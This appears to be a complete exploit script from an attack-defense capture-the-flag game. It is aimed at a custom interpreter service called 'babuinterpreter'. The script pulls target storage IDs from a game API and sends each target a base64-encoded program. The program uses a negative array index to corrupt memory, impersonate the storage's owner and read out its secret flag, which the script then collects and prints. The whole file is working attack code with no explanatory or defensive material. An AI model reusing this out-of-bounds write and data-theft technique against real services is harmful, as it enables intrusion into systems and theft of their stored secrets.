#!/usr/bin/env python3
import base64
import re
import socket
import sys
from typing import Iterable

import requests


FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
ATTACK_DATA_URL = "http://10.10.10.10/api/client/attack_data/"
PORT = 31337
TIMEOUT = 3
PREFIXES = ["BBBBBBBB", "12345678", "QQQQQQQQ", "zzzzzzzz", "PWN00128"]


def build_program(storage_id: str, prefix: str) -> bytes:
    attacker = prefix + storage_id[8:]
    prefix_qword = int.from_bytes(storage_id[:8].encode(), "little")
    source = (
        "babuin main()\n"
        f"\tbanana attacker = \"{attacker}\"\n"
        f"\tbanana p = {hex(prefix_qword)}\n"
        "\tbanana s = storage(attacker, \"KA\")\n"
        "\tbanana a = [p,p,p]\n"
        "\ta[-128] = a[0]\n"
        "\tprint(load(s, \"FLAG\"))\n"
        "\thoard 0\n"
    )
    return base64.b64encode(source.encode()) + b"\n"


def talk(ip: str, payload: bytes) -> str:
    with socket.create_connection((ip, PORT), timeout=TIMEOUT) as sock:
        sock.settimeout(TIMEOUT)
        sock.sendall(payload)
        chunks = []
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
    return b"".join(chunks).decode("latin1", "ignore")


def fetch_storage_ids(ip: str) -> list[str]:
    try:
        data = requests.get(ATTACK_DATA_URL, timeout=TIMEOUT).json()
    except Exception:
        return []
    return [item for item in data.get("babuinterpreter", {}).get(ip, []) if item.startswith("storage") and len(item) == 23]


def extract_flags(ip: str, storage_id: str) -> Iterable[str]:
    found: list[str] = []
    for prefix in PREFIXES:
        payload = build_program(storage_id, prefix)
        first = talk(ip, payload)
        second = talk(ip, payload)
        found.extend(FLAG_RE.findall(first))
        found.extend(FLAG_RE.findall(second))
        if found:
            break
    return found


def main() -> None:
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} IP", file=sys.stderr)
        raise SystemExit(1)

    ip = sys.argv[1]
    seen: set[str] = set()
    for storage_id in fetch_storage_ids(ip):
        for flag in extract_flags(ip, storage_id):
            if flag not in seen:
                seen.add(flag)
                print(flag, flush=True)


if __name__ == "__main__":
    main()
